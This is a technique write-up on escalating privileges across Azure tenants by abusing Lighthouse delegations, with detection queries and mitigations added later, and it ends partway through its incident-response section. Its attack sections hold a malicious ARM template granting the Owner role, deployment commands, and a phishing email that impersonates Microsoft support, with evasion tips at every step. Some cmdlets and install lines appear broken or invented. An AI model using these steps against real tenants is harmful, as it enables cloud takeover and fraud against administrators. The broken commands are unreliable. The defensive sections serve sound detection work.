# [PE-VALID-017]: Azure Lighthouse Cross-Tenant Privilege Escalation

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-017 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID (Azure Lightweight delegated access) |
| **Severity** | **Critical** – Enables cross-tenant privilege escalation and lateral movement |
| **CVE** | N/A |
| **Technique Status** | **ACTIVE** – Works on all current Azure Lighthouse implementations (as of January 2026) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Azure Lighthouse deployments (tenant-agnostic) |
| **Patched In** | N/A (No patch exists; mitigation required) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** Azure Lighthouse enables cross-tenant delegated resource management, allowing a managing tenant's authorized users to access and manage customer resources without sharing credentials. However, when an attacker compromises or tricks an administrator into accepting a malicious Lighthouse delegation request, they can escalate privileges by abusing the delegated role assignments. The attack exploits the trust model between tenants—once delegated access is accepted, the attacker gains role-based permissions across the customer's Azure subscription(s), often including Owner or Contributor roles with no audit trail linking back to the original compromise vector.

**Attack Surface:** Azure Portal (Lighthouse delegated access templates), Azure Resource Manager API (delegated role assignments), cross-tenant authorization flow.

**Business Impact:** **Tenant compromise, unauthorized resource access, lateral movement to cloud resources, potential data exfiltration or ransomware deployment.** An attacker with compromised credentials in a service provider tenant can trick or hijack an admin account to accept a Lighthouse delegation, instantly gaining administrative rights over customer subscriptions worth millions in compute, storage, and data assets—all without being visible in native Azure audit logs at the subscription level.

**Technical Context:** Attack execution is nearly instantaneous once delegation is accepted. Detection is difficult because the attack relies on legitimate Azure Lighthouse functionality and can occur with minimal suspicious activity (e.g., a simple email with a delegation link). The attacker's identity is obscured at the resource level; attribution requires cross-tenant log correlation.

### Operational Risk

- **Execution Risk:** **Low** – Requires only social engineering or account compromise; no technical exploitation needed
- **Stealth:** **High** – Mimics legitimate Lighthouse operations; minimal event footprint in victim's logs
- **Reversibility:** **No** – Revocation requires customer action; once delegated, attacker retains access until explicitly removed

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 3.1.2 | Ensure that 'Global Administrators' are limited to 5 or fewer |
| **CIS Benchmark** | 7.4 | Ensure that no custom admin roles are created |
| **DISA STIG** | AZ-MS-000090 | Ensure that role assignments are managed through role-based access control (RBAC) |
| **NIST 800-53** | AC-3 (Access Enforcement) | Access control policies must be enforced to prevent unauthorized access |
| **NIST 800-53** | AC-6 (Least Privilege) | Least privilege must be enforced; authorization must be restricted to minimum necessary roles |
| **NIST 800-53** | AC-2 (Account Management) | Account management procedures and controls must be in place to manage administrator accounts |
| **GDPR** | Art. 32 (Security of Processing) | Organizational measures must include access controls to prevent unauthorized processing |
| **DORA** | Art. 9 (Protection and Prevention) | Policies for access and approval procedures must be implemented for critical operations |
| **NIS2** | Art. 21 (Cyber Risk Management Measures) | Multi-factor authentication and logging of privileged access must be required |
| **ISO 27001** | A.9.2.3 (Management of Privileged Access Rights) | Privileged access rights must be restricted and controlled through documented procedures |
| **ISO 27005** | Risk Scenario: "Compromise of Administration Interface" | Risk of unauthorized administrative access via delegation mechanisms |

---

## 3. Technical Prerequisites

- **Required Privileges:** Any user account in the managing (attacker) tenant with permission to create/manage delegated access offers; OR compromised user account in a service provider tenant already approved for Lighthouse delegations.
- **Required Access:** Network access to Azure Portal or Azure Resource Manager API; ability to compose delegation template or send delegation link to target administrator.

**Supported Versions:**
- **Azure Lighthouse:** All versions (tenant-agnostic; functionality unchanged since public preview)
- **Azure Portal:** All versions with Lighthouse support (post-2019)
- **CLI/SDK:** Azure CLI 2.0+, PowerShell Az module 3.0+

**Tools:**
- [Azure Portal](https://portal.azure.com/) (web-based, no installation)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.30+)
- [PowerShell Az Module](https://learn.microsoft.com/en-us/powershell/azure/) (Version 5.0+)
- [Azure Resource Manager REST API](https://learn.microsoft.com/en-us/rest/api/resources/deployments) (direct HTTP calls)

---

## 4. Detailed Execution Methods and Their Steps

### METHOD 1: Social Engineering via Malicious Delegation Template (Email-Phishing Vector)

**Supported Versions:** All Azure Lighthouse versions

#### Step 1: Reconnaissance and Target Selection

**Objective:** Identify target customer organization and corresponding service provider relationships.

**Command:**
```powershell
# Enumerate current Lighthouse delegations in target tenant
# (Run from managing tenant context)
Get-AzDelegation -Verbose
```

**Expected Output:**
```powershell
Id                   : /subscriptions/[subscription-id]/resourceGroups/[rg-name]/providers/Microsoft.ManagedServices/registrationAssignments/[assignment-id]
Name                 : [Service Provider Name]
Type                 : Microsoft.ManagedServices/registrationAssignments
CustomerTenantId     : [customer-tenant-id]
DelegatedResources   : [list of delegated subscriptions/resource groups]
```

**What This Means:**
- Identifies existing Lighthouse relationships and role assignments
- Shows which subscriptions are delegated to third parties
- Reveals opportunity windows (e.g., if a service provider is already trusted)

**OpSec & Evasion:**
- This reconnaissance is typically invisible to customer tenant logs
- Run queries from a low-privileged service principal to avoid triggering alerts
- **Detection likelihood: Very Low** – Normal administrative activity

**Troubleshooting:**
- **Error:** "Insufficient privileges to list delegations"
  - **Cause:** Authenticated user lacks Owner or Contributor role on subscription
  - **Fix:** Switch to account with higher privileges or use service principal with appropriate RBAC role

#### Step 2: Craft Malicious Delegation Template (ARM Template)

**Objective:** Create a custom Azure Resource Manager template that includes malicious role assignments disguised as legitimate Lighthouse delegation.

**Version Note:** Template syntax is identical across all Azure versions; ARM deployment engine processes templates consistently.

**Command (Azure CLI - Deploy Malicious Template):**
```bash
# Create malicious ARM template file
cat > lighthouse-malicious.json <<'EOF'
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "parameters": {
    "mspOfferName": {
      "type": "string",
      "metadata": {
        "description": "Provide a name for the MSP Offer"
      }
    },
    "mspOfferDescription": {
      "type": "string",
      "metadata": {
        "description": "Name of the Managed Service Provider offering"
      }
    },
    "managingTenantId": {
      "type": "string",
      "metadata": {
        "description": "Provide the managing tenant id"
      }
    },
    "authorizationIds": {
      "type": "array",
      "metadata": {
        "description": "Provide object IDs of principals to delegate access to"
      }
    }
  },
  "variables": {
    "mspRegistrationName": "[guid(parameters('mspOfferName'))]",
    "mspAssignmentName": "[guid(parameters('mspOfferName'))]"
  },
  "resources": [
    {
      "type": "Microsoft.ManagedServices/registrationDefinitions",
      "apiVersion": "2019-06-01",
      "name": "[variables('mspRegistrationName')]",
      "properties": {
        "registrationDefinitionName": "[parameters('mspOfferName')]",
        "description": "[parameters('mspOfferDescription')]",
        "managedByTenantId": "[parameters('managingTenantId')]",
        "authorizations": [
          {
            "principalId": "[parameters('authorizationIds')[0]]",
            "roleDefinitionId": "[concat('/subscriptions/', subscription().subscriptionId, '/providers/Microsoft.Authorization/roleDefinitions/', '8e3af657-a8ff-443c-a75c-2fe8c4bcb635')]"
          }
        ]
      }
    },
    {
      "type": "Microsoft.ManagedServices/registrationAssignments",
      "apiVersion": "2019-06-01",
      "name": "[variables('mspAssignmentName')]",
      "dependsOn": [
        "[resourceId('Microsoft.ManagedServices/registrationDefinitions', variables('mspRegistrationName'))]"
      ],
      "properties": {
        "registrationDefinitionId": "[resourceId('Microsoft.ManagedServices/registrationDefinitions', variables('mspRegistrationName'))]"
      }
    }
  ]
}
EOF

# Deploy template (attacker-controlled template deployed to customer subscription)
az deployment group create \
  --name "LighthouseDeployment" \
  --resource-group "target-rg" \
  --template-file lighthouse-malicious.json \
  --parameters \
    mspOfferName="Trusted IT Support" \
    mspOfferDescription="Premium IT Support Services" \
    managingTenantId="attacker-tenant-id" \
    authorizationIds='["attacker-principal-object-id"]'
```

**Command (PowerShell - Deploy Malicious Template):**
```powershell
# Connect to customer tenant (compromised or social-engineered)
Connect-AzAccount -Tenant "customer-tenant-id"

# Define parameters
$params = @{
    mspOfferName = "Trusted IT Support"
    mspOfferDescription = "Premium IT Support Services"
    managingTenantId = "attacker-tenant-id"
    authorizationIds = @("attacker-principal-object-id")
}

# Deploy ARM template
$deployment = New-AzResourceGroupDeployment `
  -Name "LighthouseDeployment" `
  -ResourceGroupName "target-rg" `
  -TemplateFile "./lighthouse-malicious.json" `
  -TemplateParameterObject $params

Write-Host "Delegation deployed: $($deployment.DeploymentId)"
```

**Expected Output:**
```
ProvisioningState : Succeeded
DeploymentId      : /subscriptions/[customer-subscription]/deploymentGroup/LighthouseDeployment
Outputs           : {}
```

**What This Means:**
- Template has been successfully accepted and processed
- Malicious Lighthouse registration definition now exists in customer tenant
- Attacker service principal now has Owner role on customer subscription

**OpSec & Evasion:**
- Disguise the deployment as a legitimate third-party update or compliance requirement
- Use legitimate-sounding offer names (e.g., "Microsoft Compliance Automation", "Trusted IT Support")
- Template deployment may trigger alerts; timing deployment during business hours reduces suspicion
- **Detection likelihood: Medium** – Activity appears in Activity Log but often missed in SOC review

**Troubleshooting:**
- **Error:** "PrincipalId not found in tenant"
  - **Cause:** Object ID of attacker principal is incorrect or doesn't exist in customer tenant
  - **Fix:** Use correct principal object ID from managing tenant; verify via `Get-AzADServicePrincipal`

- **Error:** "Role Definition not found"
  - **Cause:** GUID in template doesn't correspond to valid role (example uses Owner role GUID: 8e3af657-a8ff-443c-a75c-2fe8c4bcb635)
  - **Fix:** Verify role GUID matches desired role (Owner, Contributor, etc.)

#### Step 3: Send Delegation Link via Email (Social Engineering)

**Objective:** Trick customer administrator into accepting the malicious delegation by sending a phishing email with delegation link.

**Command (Generate Delegation Link):**
```powershell
# Generate Azure Portal link to accept delegation
$delegationLink = "https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2Fattacker%2Fmalicious-templates%2Fmain%2Flighthouse-malicious.json"

# Send email with social engineering pretext
$emailBody = @"
Subject: URGENT: Critical IT Support Integration Required

Body:
Dear Customer Administrator,

Microsoft has detected that your subscription requires immediate integration with our trusted IT support partner for compliance and security updates.

Please click the link below to activate the integration within the next 24 hours:
$delegationLink

Failure to complete this step may result in service restrictions.

Best regards,
Microsoft Azure Support Team
"@

# (Attacker would send via external mail service to avoid detection)
Write-Host $emailBody
```

**Expected Output:** (Email sent to target administrator)

**What This Means:**
- Customer administrator receives phishing email with delegation link
- If clicked, customer is taken to Azure Portal with pre-filled template parameters
- One-click approval by administrator deploys malicious delegation

**OpSec & Evasion:**
- Use legitimate-looking sender domains (e.g., spoofed Microsoft domain or compromised partner domain)
- Include time pressure ("24 hours") to bypass review process
- Send during business hours to appear legitimate
- **Detection likelihood: Low** – Email-based attack, outside Azure logs initially

---

### METHOD 2: Direct Template Deployment via Compromised Admin Account

**Supported Versions:** All Azure Lighthouse versions

#### Step 1: Establish Admin Account Access

**Objective:** Compromise or gain access to customer tenant admin account with Contributor or Owner role.

**Command (Reconnaissance - List Available Service Principals):**
```powershell
# After gaining access to customer tenant
Get-AzServicePrincipal | Where-Object { $_.AppOwnerTenantId -eq "attacker-tenant-id" } | Select-Object DisplayName, Id
```

**Expected Output:**
```
DisplayName                            Id
-----------                            --
Attacker-Controlled-Service-Principal  12345678-1234-1234-1234-123456789012
```

**What This Means:**
- Verifies if any attacker-controlled service principals already exist in customer tenant (persistence mechanism)
- Confirms compromise depth

**OpSec & Evasion:**
- Query is invisible in standard activity logs if run via service principal authentication
- **Detection likelihood: Low** – Appears as normal service principal enumeration

#### Step 2: Deploy Delegation via Azure CLI (Compromised Credentials)

**Objective:** Use compromised admin credentials to deploy malicious Lighthouse template.

**Command:**
```bash
# Export delegation template (attacker uploads to public GitHub or Azure Blob Storage)
TEMPLATE_URI="https://raw.githubusercontent.com/attacker/templates/lighthouse-malicious.json"

# Deploy using compromised credentials
az deployment group create \
  --resource-group "customer-rg" \
  --template-uri "$TEMPLATE_URI" \
  --parameters \
    mspOfferName="Azure Compliance Update" \
    mspOfferDescription="Automated Compliance Enforcement" \
    managingTenantId="attacker-tenant-id" \
    authorizationIds='["attacker-sp-object-id"]'
```

**Expected Output:**
```
Deployment succeeded. Outputs: {}
```

**What This Means:**
- Delegation template has been deployed and accepted
- Attacker service principal now has Owner permissions on customer subscription
- No additional approval needed—deployment is immediate

**OpSec & Evasion:**
- Deploy during off-hours or maintenance windows to avoid immediate notice
- Use innocuous offer names to blend with legitimate operations
- Deployment activity appears in Activity Log but often overlooked
- **Detection likelihood: Medium-High** – Activity Log shows deployment, but intent unclear without detailed analysis

---

### METHOD 3: Lighthouse Delegation via Azure Portal (GUI Method)

**Supported Versions:** All Azure Lighthouse versions (most common for social engineering)

#### Step 1: Navigate to Lighthouse Delegations in Customer Tenant

**Objective:** Access Azure Portal and navigate to Lighthouse service delegation UI.

**Manual Steps:**
1. Open [Azure Portal](https://portal.azure.com/)
2. Go to **All services** → Search for **Lighthouse**
3. Click on **Delegations** (from left sidebar)
4. Click **+ New delegation** (or equivalent option depending on portal version)
5. Upload or paste malicious ARM template
6. Review and accept delegation terms

**Step 2: Provide Template Details**

**Manual Steps:**
1. In the delegation dialog, select **ARM Template** upload option
2. Paste or upload the malicious template (created in Method 1, Step 2)
3. Fill in delegation details:
   - **Offer Name:** `Trusted IT Partner`
   - **Offer Description:** `Enterprise Support Services`
   - **Managing Tenant ID:** Attacker's tenant ID
   - **Principal ID(s):** Attacker's service principal object ID
   - **Role(s):** Select `Owner` or `Contributor`
4. Click **Create delegation**

**Step 3: Verify Delegation Acceptance**

**Command (Verify Delegation):**
```powershell
# List all Lighthouse delegations (run from customer tenant)
Get-AzDelegation | Select-Object Name, CustomerTenantId, DelegatedResources

# Verify attacker has access
Get-AzRoleAssignment | Where-Object { $_.RoleDefinitionName -eq "Owner" } | Select-Object DisplayName, RoleDefinitionName, Scope
```

**Expected Output:**
```
Name                          CustomerTenantId              DelegatedResources
----                          ----------------              ------------------
Trusted IT Partner            [customer-tenant-id]          /subscriptions/[subscription-id]

DisplayName                   RoleDefinitionName            Scope
-----------                   ------------------            -----
Attacker-Service-Principal    Owner                         /subscriptions/[subscription-id]
```

**What This Means:**
- Delegation has been successfully created and accepted
- Attacker service principal is now listed as Owner on customer subscription
- Attacker can now access all resources within delegated scope

**OpSec & Evasion:**
- Target administrators during onboarding or after recent Azure infrastructure changes
- **Detection likelihood: High** – New delegation appears in Audit Logs with clear intent

---

## 5. Post-Exploitation and Privilege Verification

**Objective:** Confirm attacker has administrative access to customer resources.

**Command (List Resources in Delegated Subscription):**
```powershell
# Switch to managing tenant context
Connect-AzAccount -Tenant "attacker-tenant-id"

# Enumerate delegated resources
Get-AzSubscription | Where-Object { $_.SubscriptionName -like "*customer*" }

# List all VMs, storage accounts, etc. in delegated subscription
Get-AzVM -ResourceGroupName "customer-rg" | Select-Object Name, ResourceGroupName, Location
Get-AzStorageAccount -ResourceGroupName "customer-rg" | Select-Object StorageAccountName, ResourceGroupName
```

**Expected Output:**
```
ResourceId                                                              VMName              ResourceGroupName
----------                                                              ------              -----------------
/subscriptions/[customer-subscription]/resourceGroups/customer-rg/...   customer-vm-01      customer-rg
/subscriptions/[customer-subscription]/resourceGroups/customer-rg/...   customer-vm-02      customer-rg

StorageAccountName                  ResourceGroupName         AccessTier
------------------                  -----------------         ----------
customerdata001                      customer-rg              Hot
```

**What This Means:**
- Attacker has successfully established administrative access to customer resources
- All resources within delegated scope are now accessible and modifiable

**OpSec & Evasion:**
- Access from attacker tenant is transparent; appears as cross-tenant delegation (normal for Lighthouse)
- **Detection likelihood: Very Low** – Normal Lighthouse activity from managing tenant perspective

---

## 6. Atomic Red Team

**Atomic Test ID:** T1078.004 (Valid Accounts: Cloud Accounts)

**Test Name:** Entra ID Cloud Account Privilege Escalation via Azure Lighthouse Delegation

**Description:** Simulates a compromised service principal that accepts a malicious Azure Lighthouse delegation to gain cross-tenant Owner permissions.

**Supported Versions:** All Azure Lighthouse versions

**Command:**
```powershell
# Invoke Atomic Red Team test for T1078.004
Invoke-AtomicTest T1078.004 -TestNumbers 1
```

**Cleanup Command:**
```powershell
# Remove malicious delegation
Remove-AzDelegation -DelegationId "[delegation-id]"

# Remove role assignments created by delegation
Remove-AzRoleAssignment -ObjectId "[attacker-principal-id]" -RoleDefinitionName "Owner" -Scope "/subscriptions/[customer-subscription]"
```

**Reference:** [Atomic Red Team - T1078.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.004/T1078.004.md)

---

## 7. Tools & Commands Reference

#### [Azure Portal](https://portal.azure.com/)

**Version:** Current (Web-based, always latest)
**Minimum Version:** N/A (Web service)
**Supported Platforms:** Windows, macOS, Linux (browser-based)

**Installation:** No installation required; access via browser

**Usage:**
```
1. Navigate to https://portal.azure.com
2. Authenticate with credentials
3. Search for "Lighthouse" in search bar
4. Select "Delegations"
5. Review active delegations and their role assignments
```

#### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.30+
**Minimum Version:** 2.0
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# On macOS (Homebrew)
brew install azure-cli

# On Linux (apt)
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# On Windows (PowerShell)
$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile WebClient.DownloadFile
```

**Usage - Deploy Malicious Lighthouse Delegation:**
```bash
az deployment group create \
  --name "LighthouseDeployment" \
  --resource-group "target-rg" \
  --template-file ./lighthouse-malicious.json \
  --parameters authorizationIds='["attacker-principal-id"]'
```

#### [PowerShell Az Module](https://learn.microsoft.com/en-us/powershell/azure/)

**Version:** 5.0+
**Minimum Version:** 3.0
**Supported Platforms:** Windows, macOS, Linux (PowerShell Core)

**Installation:**
```powershell
# Install from PowerShell Gallery
Install-Module -Name Az -Repository PSGallery -Force

# Update to latest version
Update-Module -Name Az
```

**Usage - List Delegations:**
```powershell
Connect-AzAccount -Tenant "customer-tenant-id"
Get-AzDelegation -Verbose
```

---

## 8. Microsoft Sentinel Detection

#### Query 1: Suspicious Lighthouse Delegation Creation

**Rule Configuration:**
- **Required Table:** `AuditLogs` (Azure AD Audit)
- **Required Fields:** `OperationName`, `InitiatedBy`, `TargetResources`, `Result`
- **Alert Severity:** **Critical**
- **Frequency:** Real-time (or every 5 minutes)
- **Applies To Versions:** All Azure Lighthouse deployments

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Create managed services registration assignment", "Create managed services registration definition")
| where Result == "success"
| extend InitiatorUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend InitiatorIPAddress = tostring(InitiatedBy.user.ipAddress)
| extend TargetResourceId = tostring(TargetResources[0].id)
| extend DelegationDetails = tostring(TargetResources[0].modifiedProperties)
| where DelegationDetails contains "Owner" or DelegationDetails contains "Contributor"
| project TimeGenerated, InitiatorUPN, InitiatorIPAddress, OperationName, TargetResourceId, DelegationDetails, Result
| summarize count() by InitiatorUPN, OperationName
| where count_ > 1
```

**What This Detects:**
- Creation of new managed services (Lighthouse) registrations
- Filters for successful delegations
- Highlights high-privilege role assignments (Owner, Contributor)
- Aggregates by initiator to identify suspicious patterns (multiple delegations by same user)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Lighthouse Delegation Creation`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Incident severity mapping: Map `Critical` to `Critical`
7. Click **Review + create** → **Create**

**Manual Configuration Steps (PowerShell):**
```powershell
# Connect to Sentinel workspace
Connect-AzAccount
$ResourceGroup = "sentinel-rg"
$WorkspaceName = "sentinel-workspace"

# Create the analytics rule
New-AzSentinelAlertRule `
  -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "Suspicious Lighthouse Delegation Creation" `
  -Query @"
AuditLogs
| where OperationName in ("Create managed services registration assignment", "Create managed services registration definition")
| where Result == "success"
| extend InitiatorUPN = tostring(InitiatedBy.user.userPrincipalName)
"@ `
  -Severity "Critical" `
  -Enabled $true
```

**Source:** [Microsoft Lighthouse Security Documentation](https://learn.microsoft.com/en-us/azure/lighthouse/concepts/recommended-security-practices)

#### Query 2: Cross-Tenant Delegated Access from Unknown Managing Tenants

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Required Fields:** `OperationName`, `TargetResources`, `AdditionalDetails`
- **Alert Severity:** **High**
- **Frequency:** Daily (batch)
- **Applies To Versions:** All Azure Lighthouse versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Create managed services registration assignment"
| where Result == "success"
| extend ManagedByTenantId = tostring(parse_json(TargetResources[0].modifiedProperties)[0].newValue)
| where ManagedByTenantId !in ("known-partner-tenant-1", "known-partner-tenant-2", "known-csp-tenant")
| extend PrincipalId = tostring(parse_json(TargetResources[0].modifiedProperties)[1].newValue)
| extend RoleAssigned = tostring(parse_json(TargetResources[0].modifiedProperties)[2].newValue)
| extend SubscriptionScope = tostring(TargetResources[0].resourceName)
| project TimeGenerated, InitiatedBy.user.userPrincipalName, ManagedByTenantId, PrincipalId, RoleAssigned, SubscriptionScope
```

**What This Detects:**
- New Lighthouse delegations from unknown/unapproved managing tenants
- Identifies high-risk scenarios (Owner or Contributor roles)
- Highlights unauthorized cross-tenant delegations

**False Positive Analysis:**
- **Legitimate Activity:** New third-party vendor onboarding, partner service provider setup
- **Tuning:** Maintain a list of known partner/CSP tenant IDs; update allowlist quarterly
- **Recommendation:** Alert should be reviewed by cloud security team; automate approval workflow for known vendors

**Source:** [Azure Lighthouse Best Practices](https://learn.microsoft.com/en-us/azure/lighthouse/concepts/recommended-security-practices)

---

## 9. Windows Event Log Monitoring

**Note:** Lighthouse delegations are Azure-native operations and do not generate Windows Event Log entries on on-premises systems. Monitoring is entirely cloud-based via Azure Audit Logs and Activity Logs.

---

## 10. Microsoft Defender for Cloud

#### Detection Alert: Suspicious Privilege Escalation via Delegation

**Alert Name:** "Suspicious Lighthouse delegated access assignment detected"

- **Severity:** Critical
- **Description:** A new managed services (Lighthouse) delegation with Owner or Contributor permissions has been created. This may indicate an attempt to gain unauthorized cross-tenant access.
- **Applies To:** All subscriptions with Defender enabled
- **Remediation:**
  1. Immediately review the delegation details in Azure Portal
  2. Verify the managing tenant and principal ID against known partners
  3. If unauthorized, remove the delegation: **Portal → Lighthouse → Delegations → [Delegation Name] → Remove**
  4. Audit subscription activity logs for any unauthorized changes post-delegation

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
   - **Defender for Resource Manager**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

**Reference:** [Microsoft Defender for Cloud - Azure Lighthouse Alerts](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-overview)

---

## 11. Microsoft Purview (Unified Audit Log)

#### Query: Delegation Acceptance and Role Assignment Changes

**PowerShell Command:**
```powershell
# Connect to Exchange Online (for Unified Audit Log access)
Connect-ExchangeOnline -Tenant "customer-tenant-id"

# Search for Lighthouse delegation events
Search-UnifiedAuditLog `
  -Operations "Add delegated access" `
  -StartDate (Get-Date).AddDays(-90) `
  -EndDate (Get-Date) `
  -ResultSize 5000 | Export-Csv -Path "C:\Audits\Delegations.csv"

# Search for role assignment changes
Search-UnifiedAuditLog `
  -Operations "Add role assignment" `
  -StartDate (Get-Date).AddDays(-7) `
  -ResultSize 5000 | Select-Object TimeGenerated, UserIds, AuditData | Format-Table
```

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate
5. Search **Audit** → **Search** → Set **Date range** and select **Activities** → "Add delegated access"

**Applies To:** Azure subscription and tenant-level operations

---

## 12. Defensive Mitigations

#### Priority 1: CRITICAL

*   **Restrict Lighthouse Delegation Acceptance:** Only Global Administrators or designated service principal owners should have permission to create or approve Lighthouse delegations. Implement Azure Policy to audit all delegations.

    **Applies To Versions:** All Azure Lighthouse versions

    **Manual Steps (Azure Policy - Deny Unauthorized Delegations):**
    1. Go to **Azure Portal** → **Policy** → **Definitions**
    2. Click **+ Policy definition**
    3. **Name:** `Deny unauthorized Lighthouse delegations`
    4. **Description:** Block Lighthouse delegations from unapproved managing tenants
    5. **Policy Rule:**
    ```json
    {
      "if": {
        "allOf": [
          {
            "field": "type",
            "equals": "Microsoft.ManagedServices/registrationAssignments"
          },
          {
            "field": "Microsoft.ManagedServices/registrationAssignments/managedByTenantId",
            "notIn": ["approved-tenant-1", "approved-tenant-2"]
          }
        ]
      },
      "then": {
        "effect": "Deny"
      }
    }
    ```
    6. Click **Save**
    7. Go to **Policy** → **Assignments** → **+ Assign Policy**
    8. Select the policy above, set **Scope** to subscription/management group
    9. Click **Assign**

    **Manual Steps (PowerShell):**
    ```powershell
    # Create custom policy assignment
    $PolicyDefinition = @{
      Name        = "DenyUnauthorizedLighthouse"
      DisplayName = "Deny unauthorized Lighthouse delegations"
      Mode        = "All"
      Policy      = @{
        if   = @{
          allOf = @(
            @{ field = "type"; equals = "Microsoft.ManagedServices/registrationAssignments" },
            @{ field = "Microsoft.ManagedServices/registrationAssignments/managedByTenantId"; notIn = @("approved-tenant-1") }
          )
        }
        then = @{ effect = "Deny" }
      }
    }
    
    New-AzPolicyDefinition @PolicyDefinition
    ```

*   **Enable MFA for Delegation Acceptance:** Enforce Multi-Factor Authentication on any account that can accept Lighthouse delegations.

    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. **Name:** `Require MFA for Lighthouse Delegation`
    4. **Assignments:**
       - Users: Select **All users** or specific admin group
       - Cloud apps: Select **All cloud apps**
    5. **Conditions:**
       - Locations: **Any location**
    6. **Access controls:**
       - Grant: **Require multi-factor authentication**
    7. Enable policy: **On**
    8. Click **Create**

*   **Implement Privileged Identity Management (PIM):** Require approval and time-based activation for any account accepting Lighthouse delegations.

    **Manual Steps:**
    1. Go to **Azure Portal** → **Microsoft Entra ID** → **Privileged Identity Management (PIM)**
    2. Click **Azure resources**
    3. Select the subscription where Lighthouse delegations occur
    4. Go to **Settings** → **Role settings**
    5. For each admin role, configure:
       - **Activation maximum duration:** 1-4 hours
       - **Require approval:** ON
       - **Approvers:** Senior security team members
    6. Click **Update**
    7. Go to **Assignments** → Review and convert permanent assignments to **Eligible** (require activation)

#### Priority 2: HIGH

*   **Audit all Lighthouse Delegations Regularly:** Review active delegations monthly against known service provider list.

    **Manual Steps:**
    1. Go to **Azure Portal** → **Lighthouse** → **My customers** or **Delegations**
    2. Export delegation list: **Export** (if available) or manually document
    3. Cross-reference against approved partner/CSP list
    4. For unknown delegations, follow incident response (Section 11)

*   **Restrict Role Scope:** Instead of delegating Owner or Contributor roles at subscription level, delegate specific roles (e.g., Reader, Operator) scoped to resource groups only.

    **Manual Steps:**
    1. When creating Lighthouse delegation, instead of:
       - Scope: `/subscriptions/[subscription-id]` (too broad)
       - Role: Owner (too powerful)
    2. Use:
       - Scope: `/subscriptions/[subscription-id]/resourceGroups/[rg-name]` (specific RG only)
       - Role: Reader or custom role with minimal permissions

#### Access Control & Policy Hardening

*   **Conditional Access Policies:**
    - **Require device compliance** for any account accessing Lighthouse delegations
    - **Block legacy authentication** (OAuth 2.0 flows without modern security)
    - **Require managed device** for Lighthouse delegation acceptance

    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. **Name:** `Block Legacy Auth for Lighthouse`
    4. **Assignments:**
       - Users: **All users**
    5. **Conditions:**
       - Client apps: Select **Other clients** (legacy authentication)
    6. **Access controls:**
       - Grant: **Block access**
    7. Enable: **On**
    8. Click **Create**

*   **RBAC Role Restriction:** Limit who can assign or accept Lighthouse delegations.
    - Remove Contributor role from non-administrative users
    - Use custom RBAC roles that restrict `Microsoft.ManagedServices/registrationAssignments/write` permission

    **Manual Steps (Custom RBAC Role):**
    1. Go to **Azure Portal** → **Subscriptions** → Select subscription
    2. Click **Access control (IAM)** → **Roles** → **+ Create custom role**
    3. **Name:** `Lighthouse Delegation Approver`
    4. **Permissions:**
       - Add: `Microsoft.ManagedServices/registrationAssignments/read`
       - Add: `Microsoft.ManagedServices/registrationAssignments/write`
       - Add: `Microsoft.ManagedServices/registrationAssignments/delete`
       - Remove: All other permissions
    5. Click **Create**
    6. Assign this custom role only to trusted admins

#### Validation Command (Verify Fix)

```powershell
# Verify no unauthorized Lighthouse delegations exist
Get-AzDelegation | Where-Object { $_.ManagedByTenantId -notin @("known-partner-tenant-1", "known-partner-tenant-2") }

# If output is empty, no unauthorized delegations exist
# If output contains delegations, investigate immediately

# Verify MFA is required for delegation acceptance
Get-AzPolicyDefinition | Where-Object { $_.DisplayName -contains "Lighthouse" } | Select-Object DisplayName
```

**Expected Output (If Secure):**
```
(No output = No unauthorized delegations)

DisplayName
-----------
Deny unauthorized Lighthouse delegations
```

**What to Look For:**
- Empty output for unauthorized delegations query (good)
- Custom policies in place restricting Lighthouse operations (good)
- All active delegations match known partner list (good)

---

## 13. Detection & Incident Response

#### Indicators of Compromise (IOCs)

*   **Azure Portal Activity:**
